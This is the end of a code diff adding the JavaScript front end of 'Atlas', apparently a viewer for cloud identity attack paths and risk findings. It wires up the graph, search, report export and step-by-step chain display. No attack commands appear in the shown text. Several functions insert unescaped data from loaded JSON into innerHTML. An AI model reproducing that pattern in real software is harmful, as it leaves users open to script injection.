+        pathsList.appendChild(el);
+      });
+    }
+
+    findingsList.innerHTML = '';
+    if (risk_findings.length === 0) {
+      findingsEmpty.style.display = 'block';
+    } else {
+      findingsEmpty.style.display = 'none';
+      risk_findings.forEach((f, i) => {
+        const el = document.createElement('div');
+        el.className = `finding-item ${(f.severity || 'MEDIUM').toLowerCase()}`;
+        el.innerHTML = `
+          <div class="finding-title">${f.title || 'Finding'}</div>
+          <div class="finding-rule">${f.rule_id || ''}</div>
+        `;
+        el.onclick = () => showFindingModal(f);
+        findingsList.appendChild(el);
+      });
+    }
+  }
+
+  function showFindingModal(f) {
+    const modal = document.getElementById('finding-modal');
+    const title = document.getElementById('finding-modal-title');
+    const body = document.getElementById('finding-modal-body');
+    title.textContent = f.title || 'Finding';
+    const sev = (f.severity || 'MEDIUM').toUpperCase();
+    body.innerHTML = `
+      <span class="severity-badge ${sev.toLowerCase()}">${sev}</span>
+      <div class="section"><h4>Description</h4><p>${f.description || '-'}</p></div>
+      <div class="section"><h4>Remediation</h4><p>${f.remediation || '-'}</p></div>
+      ${f.evidence && Object.keys(f.evidence).length ? `<div class="section"><h4>Evidence</h4><pre>${JSON.stringify(f.evidence, null, 2)}</pre></div>` : ''}
+      ${f.affected_nodes?.length ? `<div class="section"><h4>Affected</h4><pre>${f.affected_nodes.join('\n')}</pre></div>` : ''}
+    `;
+    modal.classList.add('visible');
+  }
+
+  function populateChainSelect() {
+    const sel = document.getElementById('chain-select');
+    sel.innerHTML = '<option value="">Select identity / attack path...</option>';
+    if (!appData?.attack_paths?.length) return;
+    appData.attack_paths.forEach(p => {
+      const opt = document.createElement('option');
+      opt.value = p.id;
+      opt.textContent = `${p.id}: ${(p.summary || '').slice(0, 50)}...`;
+      sel.appendChild(opt);
+    });
+  }
+
+  function updateChainSteps() {
+    const sel = document.getElementById('chain-select');
+    const pathId = sel.value;
+    const stepsDiv = document.getElementById('chain-steps');
+    stepsDiv.innerHTML = '';
+    if (!pathId || !appData) return;
+    const path = appData.attack_paths.find(p => p.id === pathId);
+    if (!path || !path.nodes || !path.edges) return;
+    const { nodeMap } = appData;
+    path.edges.forEach((edgeKind, i) => {
+      const srcId = path.nodes[i];
+      const tgtId = path.nodes[i + 1];
+      const src = nodeMap[srcId];
+      const tgt = nodeMap[tgtId];
+      const srcArn = src?.arn || srcId;
+      const tgtArn = tgt?.arn || tgtId;
+      const cmd = getCliCommand(edgeKind, srcArn, tgtArn);
+      const step = document.createElement('div');
+      step.className = 'chain-step';
+      step.innerHTML = `
+        <div class="step-num">Step ${i + 1}: ${getEdgeLabel(edgeKind)}</div>
+        <div class="step-desc">${shortName(srcArn)} → ${shortName(tgtArn)}</div>
+        <pre>${cmd}</pre>
+      `;
+      stepsDiv.appendChild(step);
+    });
+  }
+
+  function fitGraph() {
+    if (!graphState.simulation) return;
+    const svg = document.getElementById('graph-svg');
+    const g = d3.select('#graph-svg g');
+    if (g.empty()) return;
+    const nodes = graphState.simulation.nodes();
+    if (nodes.length === 0) return;
+    const xs = nodes.map(n => n.x);
+    const ys = nodes.map(n => n.y);
+    const minX = Math.min(...xs), maxX = Math.max(...xs);
+    const minY = Math.min(...ys), maxY = Math.max(...ys);
+    const w = maxX - minX || 1, h = maxY - minY || 1;
+    const scale = Math.min(svg.clientWidth / w, svg.clientHeight / h) * 0.9;
+    const tx = (svg.clientWidth / 2) - (minX + w / 2) * scale;
+    const ty = (svg.clientHeight / 2) - (minY + h / 2) * scale;
+    d3.select('#graph-svg').call(graphState.zoom.transform, d3.zoomIdentity.translate(tx, ty).scale(scale));
+  }
+
+  function clusterGraph() {
+    if (!graphState.simulation) return;
+    graphState.simulation.alpha(0.5).restart();
+  }
+
+  function exportReportHtml() {
+    if (!appData) { alert('No data to export'); return; }
+    const meta = appData.meta || {};
+    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Atlas Report - ${meta.case || 'Export'}</title></head><body>
+<h1>Atlas Attack Path Report</h1>
+<p><strong>Case:</strong> ${meta.case || '-'} | <strong>Account:</strong> ${meta.account_id || '-'} | <strong>Source:</strong> ${meta.source_identity || '-'}</p>
+<h2>Attack Paths</h2>
+<pre>${JSON.stringify(appData.attack_paths, null, 2)}</pre>
+<h2>Findings</h2>
+<pre>${JSON.stringify(appData.risk_findings, null, 2)}</pre>
+<h2>Graph</h2>
+<pre>Nodes: ${appData.nodes.length}, Edges: ${appData.edges.length}</pre>
+</body></html>`;
+    const blob = new Blob([html], { type: 'text/html' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `atlas-report-${meta.case || 'export'}.html`;
+    a.click();
+    URL.revokeObjectURL(a.href);
+  }
+
+  function applySearch() {
+    const q = (document.getElementById('search-input').value || '').toLowerCase();
+    if (!q || !appData) return;
+    const matches = appData.nodes.filter(n =>
+      (n.name || '').toLowerCase().includes(q) ||
+      (n.arn || '').toLowerCase().includes(q) ||
+      (n.kind || '').toLowerCase().includes(q)
+    );
+    if (matches.length) {
+      const first = matches[0];
+      showDetailPanel(first);
+    }
+  }
+
+  function wireEvents() {
+    document.querySelectorAll('.sidebar-tabs button').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.sidebar-tabs button').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.sidebar-panel').forEach(p => p.classList.remove('active'));
+        btn.classList.add('active');
+        document.getElementById('panel-' + btn.dataset.tab).classList.add('active');
+      });
+    });
+
+    document.querySelectorAll('.severity-filter').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const sev = btn.dataset.sev;
+        if (graphState.activeSeverities.has(sev)) {
+          graphState.activeSeverities.delete(sev);
+        } else {
+          graphState.activeSeverities.add(sev);
+        }
+        btn.classList.toggle('active', graphState.activeSeverities.has(sev));
+        if (appData) renderGraph();
+      });
+    });
+    document.querySelectorAll('.severity-filter').forEach(btn => {
+      btn.classList.toggle('active', graphState.activeSeverities.has(btn.dataset.sev));
+    });
+
+    document.getElementById('btn-fit').addEventListener('click', fitGraph);
+    document.getElementById('btn-cluster').addEventListener('click', clusterGraph);
+    document.getElementById('btn-export').addEventListener('click', exportReportHtml);
+    document.getElementById('btn-analyzer').addEventListener('click', () => {
+      document.getElementById('analyzer-modal').classList.add('visible');
+      populateChainSelect();
+    });
+    document.getElementById('btn-open-json').addEventListener('click', () => document.getElementById('file-input').click());
+    document.getElementById('file-input').addEventListener('change', (e) => {
+      const f = e.target.files?.[0];
+      if (f) loadFromFile(f).then(d => {
+        document.querySelector('.graph-container .empty-state')?.remove();
+        initData(d); renderGraph(); renderSidebar(); populateChainSelect();
+      }).catch(alert);
+      e.target.value = '';
+    });
+
+    document.getElementById('detail-close').addEventListener('click', () => document.getElementById('detail-panel').classList.remove('visible'));
+    document.getElementById('analyzer-close').addEventListener('click', () => document.getElementById('analyzer-modal').classList.remove('visible'));
+    document.getElementById('finding-close').addEventListener('click', () => document.getElementById('finding-modal').classList.remove('visible'));
+    document.getElementById('chain-select').addEventListener('change', updateChainSteps);
+
+    document.getElementById('search-input').addEventListener('keydown', (e) => { if (e.key === 'Enter') applySearch(); });
+
+    document.body.addEventListener('dragover', (e) => { e.preventDefault(); if (e.dataTransfer?.types?.includes('Files')) document.body.classList.add('dragover'); });
+    document.body.addEventListener('dragleave', (e) => { if (!e.relatedTarget || !document.body.contains(e.relatedTarget)) document.body.classList.remove('dragover'); });
+    document.body.addEventListener('drop', (e) => {
+      e.preventDefault();
+      document.body.classList.remove('dragover');
+      const f = e.dataTransfer?.files?.[0];
+      if (f && (f.name.endsWith('.json') || f.type === 'application/json')) {
+        loadFromFile(f).then(d => {
+          document.querySelector('.graph-container .empty-state')?.remove();
+          initData(d); renderGraph(); renderSidebar(); populateChainSelect();
+        }).catch(alert);
+      }
+    });
+  }
+
+  function main() {
+    wireEvents();
+    loadFromUrl()
+      .then(data => {
+        if (data) {
+          initData(data);
+          renderGraph();
+          renderSidebar();
+          populateChainSelect();
+        } else {
+          const dropZone = document.createElement('div');
+          dropZone.className = 'empty-state';
+          dropZone.innerHTML = `
+            <p>No case loaded. Load data via:</p>
+            <ul style="text-align:left;display:inline-block;margin:12px 0;">
+              <li>URL: <code>?case=CASE_NAME</code></li>
+              <li>File: Drag & drop JSON or click Open JSON</li>
+            </ul>
+            <div class="drop-zone">Drop JSON file here</div>
+          `;
+          document.querySelector('.graph-container').appendChild(dropZone);
+        }
+      })
+      .catch(err => {
+        const gc = document.querySelector('.graph-container');
+        const existing = gc.querySelector('.empty-state');
+        const errDiv = document.createElement('div');
+        errDiv.className = 'empty-state';
+        errDiv.innerHTML = `<p>Failed to load: ${err.message}</p><div class="drop-zone">Drop JSON file here</div>`;
+        if (existing) existing.replaceWith(errDiv);
+        else gc.appendChild(errDiv);
+      });
+  }
+
+  main();
+})();
+  </script>
+</body>
+</html>
